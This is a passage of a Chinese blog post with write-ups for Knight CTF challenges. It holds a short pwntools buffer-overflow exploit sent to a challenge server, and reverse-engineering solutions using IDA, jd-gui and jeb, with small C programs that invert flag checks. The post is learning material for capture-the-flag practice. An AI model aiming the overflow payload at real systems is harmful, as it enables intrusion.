<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;198.211.115.81&#x27;</span>,<span class="number">10002</span>)</span><br><span class="line"></span><br><span class="line">v6 = <span class="number">0x534B544E</span></span><br><span class="line">v7 = <span class="number">0x5445454C</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span> + p32(v6) +p32(v7) </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>得到flag：KCTF{bUfF3r_0v3Rf1Ow_i5_fUn_r1Gh7}</strong></p>
<p>偷懒不想玩return了；</p>
<h2 id="Reverse："><a href="#Reverse：" class="headerlink" title="Reverse："></a>Reverse：</h2><h3 id="The-Flag-Vault"><a href="#The-Flag-Vault" class="headerlink" title="The_Flag_Vault"></a>The_Flag_Vault</h3><p>IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/1c52a1179700b3bb.png" alt="main"></p>
<p>进入主函数看到会让输入字符串s2，然后和s1字符串比较，如果相同，就会输出flag；</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/faf802a68ce43097.png" alt="answer"></p>
<p><strong>输入s1后获得flag：KCTF{welc0me_t0_reverse_3ngineering}</strong></p>
<h3 id="the-encoder"><a href="#the-encoder" class="headerlink" title="the_encoder"></a>the_encoder</h3><p>IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/0baa9f17310e93b1.png" alt="function"></p>
<p>输入最大40个字符，然后这个for是在判断输入的长度，没什么实际的意义，不会改变输入的值；</p>
<p>之后就会把输入的字符的ascii码加上1337输出；</p>
<p>根据题里的内容，可以知道有如下的数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1412</span> <span class="number">1404</span> <span class="number">1421</span> <span class="number">1407</span> <span class="number">1460</span> <span class="number">1452</span> <span class="number">1386</span> <span class="number">1414</span> <span class="number">1449</span> <span class="number">1445</span> <span class="number">1388</span> <span class="number">1432</span> <span class="number">1388</span> <span class="number">1415</span> <span class="number">1436</span> <span class="number">1385</span> <span class="number">1405</span> <span class="number">1388</span> <span class="number">1451</span> <span class="number">1432</span> <span class="number">1386</span> <span class="number">1388</span> <span class="number">1388</span> <span class="number">1392</span> <span class="number">1462</span></span><br></pre></td></tr></table></figure>

<p>所以思路就是：把每个数减去1337，再换成ascii；</p>
<p>代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> box[<span class="number">25</span>] = &#123;<span class="number">1412</span> ,<span class="number">1404</span> ,<span class="number">1421</span> ,<span class="number">1407</span>, <span class="number">1460</span>, <span class="number">1452</span>, <span class="number">1386</span>, <span class="number">1414</span>, <span class="number">1449</span>, <span class="number">1445</span>, <span class="number">1388</span>, <span class="number">1432</span>, <span class="number">1388</span>, <span class="number">1415</span>, <span class="number">1436</span>, <span class="number">1385</span>, <span class="number">1405</span>, <span class="number">1388</span>, <span class="number">1451</span>, <span class="number">1432</span>, <span class="number">1386</span>, <span class="number">1388</span>, <span class="number">1388</span>, <span class="number">1392</span>, <span class="number">1462</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">char</span> out[<span class="number">25</span>];</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">25</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		box[i] = box[i] - <span class="number">1337</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">25</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		out[i] = box[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,out);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>运行后得到flag：KCTF{s1Mpl3_3Nc0D3r_1337}</strong></p>
<h3 id="BabyShark"><a href="#BabyShark" class="headerlink" title="BabyShark"></a>BabyShark</h3><p>这道题的文件是.jar，所以用jd-gui反编译；</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/59489432555a7161.png" alt="main"></p>
<p>可以找到这样两个关键字符串信息内容；</p>
<p>上面一张图的数据后面有等号，可以想到AES，base64加密，于是去尝试解密：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/3ec25c0b559b237b.png" alt="decrypt"></p>
<p><strong>用base64解密解出flag：KCTF{7H15_W@5_345Y_R16H7?}</strong></p>
<h3 id="flag-checker"><a href="#flag-checker" class="headerlink" title="flag_checker"></a>flag_checker</h3><p>IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/6b72d9566cfe7adc.png" alt="main"></p>
<p>这道题就是单纯的把输入的字符串v4经过两个for循环的运算之后给已有的v5字符串比较与否；</p>
<p>那么稍微改一下两个for里的算法，改成自己的逆运算，当然，第一个for的逆运算就是它自己，因为 x = -1 - y 就是 y = -1 -       x；用v5的值算回v4就行了；</p>
<p>代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> in[<span class="number">35</span>],out[<span class="number">35</span>];</span><br><span class="line">	<span class="keyword">int</span> v4[<span class="number">35</span>];</span><br><span class="line">	<span class="keyword">int</span> i,j,v7,v6;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,in);	  <span class="comment">//换做v5做运算数 </span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">35</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		v4[i] = in[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> ( j = <span class="number">0</span>; v4[j]; ++j ) </span><br><span class="line">    	v4[j] += <span class="number">32</span>;	<span class="comment">//改减为加</span></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; v4[i]; ++i )	<span class="comment">//这个for不变</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[i] &lt;= <span class="number">64</span> || v4[i] &gt; <span class="number">90</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4[i] &lt;= <span class="number">96</span> || v4[i] &gt; <span class="number">122</span> )</span><br><span class="line">        v4[i] = v4[i];</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v4[i] = <span class="number">-37</span> - v4[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4[i] = <span class="number">-101</span> - v4[i];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">   	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">35</span>;i++)</span><br><span class="line">   	&#123;</span><br><span class="line">   		out[i] = v4[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,out);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为是复制的代码用，所以会比较乱，而且写的时候是v4来运算，但实际上输入的数据是v5的；</p>
<p><strong>运行输入后得到flag：KCTF{aTbAsH_cIpHeR_wItH_sOmE_tWiSt}</strong></p>
<h3 id="Knight-Vault"><a href="#Knight-Vault" class="headerlink" title="Knight Vault"></a>Knight Vault</h3><p>IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/ac451e10a058345f.png" alt="main"></p>
<p>输入v8，让v8经过for循环的运算，再用运算的数据和v7比较与否；</p>
<p>思路还是改写for循环的运算，使其逆向，把v7变回v8；</p>
<p>代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> v7[<span class="number">43</span>];</span><br><span class="line">	<span class="keyword">int</span> v8[<span class="number">43</span>];</span><br><span class="line">	<span class="keyword">char</span> in[<span class="number">43</span>],out[<span class="number">43</span>];</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,in);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">43</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		v7[i] = in[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">43</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		v8[i] = v7[i] + <span class="number">10</span>;  <span class="comment">//改减为加</span></span><br><span class="line">		<span class="keyword">if</span>( v8[i] == <span class="number">42</span> )	<span class="comment">//两极反转</span></span><br><span class="line">			v8[i] = <span class="number">65</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">43</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		out[i] = v8[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,out);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>运行得到flag：4CTF{sO_yOu_gOt_mE_gOOd_jOOb_hApPy_hAc4iNg}</strong></p>
<h3 id="Droid-Flag"><a href="#Droid-Flag" class="headerlink" title="Droid Flag"></a>Droid Flag</h3><p>这是个安卓APK，用jeb分析：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/bef72aa45f3950bd.png" alt="main1"></p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/5565f5e41bac9e1a.png" alt="main2"></p>
<p>这是整个onCreate方法；</p>
<p>下方可以看到v1变量在添加flag样式的字符，并且使用getSx函数获取字符串；</p>
<p>如下是getSx系列：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/46cdfa92e6abc0d0.png" alt="getSx"></p>
<p>它是用16进制下标在字符串里找对应id的字符串，那就进入字符串里寻找；</p>
<p>最后结果：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/f8c6efb5cad1264c.png" alt="string"></p>
<p>从字符串里看出，就这样输入貌似并不是flag，但是把字符反着输入，就可以拼接成单词了，比如s7代表的 D10RdNa ，反转输入就变为 aNdR01D -&gt; android ；</p>
<p><strong>最后通过这样的字符串拼接方法得到flag：KCTF{aNdR01D_s1MpL3_r3V3rS3}</strong></p>
<h3 id="Knight-Switch-Bank"><a href="#Knight-Switch-Bank" class="headerlink" title="Knight Switch Bank"></a>Knight Switch Bank</h3><p>IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/01/b2a90553ece4fda1.png" alt="main"></p>
<p>输入v5，进入while循环开始选择性的运算，最后还有一个while循环，结束后让运算过的v5与v6比较与否；</p>
<p>这个套路很像之前的 flag_checker 这道题；唯一不同的就是两个循环的样子变了一下；</p>
<p>第一个循环在选择输入的字符：如果是小（大）写字母的前13个，就加13；如果是小（大）写字母的后13个，就减13；如果不是字母，就减32；</p>
<p>第二个循环就是自加2；</p>
<p>跟之前一样，改写一下循环里的东西：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> v4[<span class="number">29</span>],v5[<span class="number">29</span>];</span><br><span class="line">	<span class="keyword">char</span> in[<span class="number">29</span>],out[<span class="number">29</span>];</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> v10;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,in);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">29</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		v5[i] = in[i]; <span class="comment">//输入的是原v6，复制用的v5； </span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">29</span>;i++)</span><br><span class="line">		v5[i] -= <span class="number">2</span>;	<span class="comment">//改加为减 </span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">29</span>;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5[v10] &lt;= <span class="number">64</span> || v5[v10] &gt; <span class="number">77</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5[v10] &lt;= <span class="number">96</span> || v5[v10] &gt; <span class="number">109</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v5[v10] &lt;= <span class="number">77</span> || v5[v10] &gt; <span class="number">90</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v5[v10] &lt;= <span class="number">109</span> || v5[v10] &gt; <span class="number">122</span> )</span><br><span class="line">            v4[v10] = v5[v10] + <span class="number">32</span>;	<span class="comment">//改非字母的变化为加其他不变 </span></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            v4[v10] = v5[v10] - <span class="number">13</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v4[v10] = v5[v10] - <span class="number">13</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v4[v10] = v5[v10] + <span class="number">13</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4[v10] = v5[v10] + <span class="number">13</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v10;</span><br><span class="line">  &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">29</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		out[i] = v4[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,out);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>运行后得到flag：KCTF{So_YoU_ROT_iT_gOOd_jOOb}</strong></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>二进制方向要说没收获吧，其实还是有的，就比如安卓逆向和java逆向，当时看到的时候并不知道.getstring()函数是什么东西，更不知道其他点过去点过来的函数；都需要去网上查找学习才能弄懂；</p>
<p>因为简单，然后学习其他方向的内容，也是挺头大的，不过也同时收获很多知识；</p>
<p>比如密码学的RSA的简单了解和运用，web的SQL注入，misc 3D建模以及pacpng后缀文件的运用；</p>
<p>之后就是主打hgame了，在hgame结束的时候也会有这样类似的复盘发布的；</p>
<p><img src="https://s3.bmp.ovh/imgs/2022/01/284e22f5598d00b0.png" alt="genshin"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://secondbc.github.io/SecondBC/2022/01/26/Knight%E5%A4%BA%E6%97%97%E6%88%98/" data-id="ckyuf3s5f0000novc0bzn0bi1" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/SecondBC/page/2/">2</a><a class="extend next" rel="next" href="/SecondBC/page/2/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/SecondBC/archives/2022/10/">October 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/SecondBC/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/SecondBC/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/SecondBC/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/SecondBC/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/SecondBC/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/SecondBC/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/SecondBC/archives/2021/12/">December 2021</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/SecondBC/2022/10/04/0x41414141/">1094795585</a>
          </li>
        
          <li>
            <a href="/SecondBC/2022/10/01/Proxy-lab/">Proxy_lab</a>
          </li>
        
          <li>
            <a href="/SecondBC/2022/09/11/Malloc-Lab/">Malloc_Lab</a>
          </li>
        
          <li>
            <a href="/SecondBC/2022/08/18/%E5%81%87%E6%9C%9F%E5%A4%8D%E7%8E%B0/">假期复现</a>
          </li>
        
          <li>
            <a href="/SecondBC/2022/04/23/Shell-Lab/">Shell_Lab</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/SecondBC/" class="mobile-nav-link">Home</a>
  
    <a href="/SecondBC/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/SecondBC/fancybox/jquery.fancybox.css">

  
<script src="/SecondBC/fancybox/jquery.fancybox.pack.js"></script>




<script src="/SecondBC/js/script.js"></script>




  </div>
</body>
</html>